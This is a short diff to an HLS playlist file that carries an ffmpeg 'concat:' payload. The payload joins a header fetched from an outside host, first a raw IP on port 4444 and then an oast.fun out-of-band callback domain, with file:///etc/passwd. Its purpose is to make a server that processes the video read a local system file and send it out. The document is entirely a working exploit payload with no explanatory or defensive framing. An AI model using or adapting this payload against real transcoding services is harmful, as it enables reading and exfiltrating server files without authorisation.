@@ -1,5 +1,5 @@
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-concat:http://62.146.178.137:4444/header.m3u8|file:///etc/passwd
+concat:http://kcszbhgduhydpqurfbas4d4xvru7f8p90.oast.fun/header.m3u8|file:///etc/passwd
 #EXT-X-ENDLIST
